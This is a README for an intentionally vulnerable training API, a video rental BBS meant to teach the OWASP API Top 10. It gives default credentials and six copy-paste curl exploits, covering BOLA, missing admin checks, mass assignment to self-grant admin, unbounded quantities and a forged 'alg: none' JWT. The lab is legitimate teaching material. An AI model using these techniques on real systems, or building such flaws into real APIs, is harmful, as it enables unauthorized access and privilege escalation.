# 📼 STARLITE VIDEO BBS API — Pentest Lab

![status](https://img.shields.io/badge/status-vulnerable--by--design-red)
![docker](https://img.shields.io/badge/docker-compose-blue)
![owasp](https://img.shields.io/badge/OWASP-API%20Top%2010-orange)
![license](https://img.shields.io/badge/license-education--only-lightgrey)

```
  ███████╗████████╗ █████╗ ██████╗ ██╗     ██╗████████╗███████╗
  ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     ██║╚══██╔══╝██╔════╝
  ███████╗   ██║   ███████║██████╔╝██║     ██║   ██║   █████╗
  ╚════██║   ██║   ██╔══██║██╔══██╗██║     ██║   ██║   ██╔══╝
  ███████║   ██║   ██║  ██║██║  ██║███████╗██║   ██║   ███████╗
  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚══════╝
         V I D E O   B B S   —   D I A L   U P   T O   F U N
         [ GUEST ] [ CALL NOW: localhost:3000 ] [ 300 BAUD ]
```

A deliberately vulnerable **video rental BBS** API, built to teach the
**OWASP API Security Top 10**. 15 VHS movies, a snack bar, rentals, and
six intentional bugs for students to exploit — all running in two tiny
containers with a single command.

## Prerequisites

Only **Docker** and **Docker Compose** (the `docker compose` plugin, v2).
No Python, no Node, no venv, no database install, nothing else.

## Quickstart

```bash
git clone <this-repo-url> starlite-bbs
cd starlite-bbs
./start.sh
```

Then open **http://localhost:3000** in your browser. The API is at
**http://localhost:8000** and interactive Swagger docs at
**http://localhost:8000/docs**.

That's it — `./start.sh` is just `docker compose up --build`. The
SQLite database is created and seeded automatically on first boot.

Alternative entry points, all equivalent:

```bash
make up      # docker compose up --build
make down    # docker compose down
make clean   # docker compose down -v --rmi local  (wipes DB + images)
```

## Default credentials

| username | password  | role  | starting balance |
|----------|-----------|-------|-------------------|
| guest    | guest     | user  | $5.00             |
| admin    | admin123  | admin | $999.00           |

## Endpoints

| Method | Path                         | Auth | Notes                              |
|--------|------------------------------|------|-------------------------------------|
| GET    | /api/health                 | no   | healthcheck                        |
| POST   | /api/v1/login                | no   | returns JWT                        |
| GET    | /api/v1/movies               | no   | `?limit=` uncapped — VULN 3        |
| GET    | /api/v1/movies/{id}          | no   | movie detail                       |
| GET    | /api/v1/users/{id}           | yes  | **BOLA** — VULN 1                  |
| PUT    | /api/v1/users/{id}           | yes  | **mass assignment** — VULN 4       |
| GET    | /api/v1/rentals               | yes  | list own rentals                    |
| POST   | /api/v1/rentals               | yes  | **unrestricted qty** — VULN 5      |
| GET    | /api/v1/snacks                | no   | snack bar menu                     |
| POST   | /api/v1/snacks/order          | yes  | **unrestricted qty** — VULN 5      |
| GET    | /api/v1/admin/users           | yes* | **BFLA** — VULN 2                  |
| DELETE | /api/v1/admin/users/{id}      | yes* | **BFLA** — VULN 2                  |

`yes*` = should require admin role, but doesn't check it. That's the bug.

## Six exploits (copy-paste ready)

Grab a token first:

```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
```

**1. BOLA — read another user's profile (guest reads admin, id=2)**
```bash
curl -s http://localhost:8000/api/v1/users/2 -H "Authorization: Bearer $TOKEN"
```

**2. BFLA — guest hits admin-only endpoint**
```bash
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
```

**3. BOPLA — dump the entire movie table past intended page size**
```bash
curl -s "http://localhost:8000/api/v1/movies?limit=9999"
```

**4. Mass assignment — guest grants itself admin + free money**
```bash
curl -s -X PUT http://localhost:8000/api/v1/users/1 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"is_admin": true, "balance": 999999}'
```

**5. Unrestricted resource consumption — rent 999999 copies for "free"**
```bash
curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": 999999}'
```

**6. Forged JWT — `alg: none` token, no signature required**
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"2","username":"admin","is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $FORGED"
```

See **LAB-GUIDE.md** for the full guided walkthrough and capture-the-flag
style objectives.

## Troubleshooting

**Port already in use (8000 or 3000)**
Edit the `ports:` mapping in `docker-compose.yml`, e.g. change
`"8000:8000"` to `"8001:8000"`, then re-run `./start.sh`.

**Docker permission denied (Linux)**
Either run with `sudo ./start.sh`, or add your user to the docker group:
```bash
sudo usermod -aG docker $USER
# log out and back in
```

**Changes not showing up / stale container**
```bash
docker compose up --build --force-recreate
```

## Reset the lab to a clean state

```bash
docker compose down -v
./start.sh
```

`down -v` removes the named volume holding the SQLite file, so the next
`start.sh` reseeds from scratch.

## ⚠️ Disclaimer

This application is **intentionally vulnerable**. Never deploy it on a
public network or reuse any of its code, secrets, or patterns in a real
product. For isolated, offline educational use only.
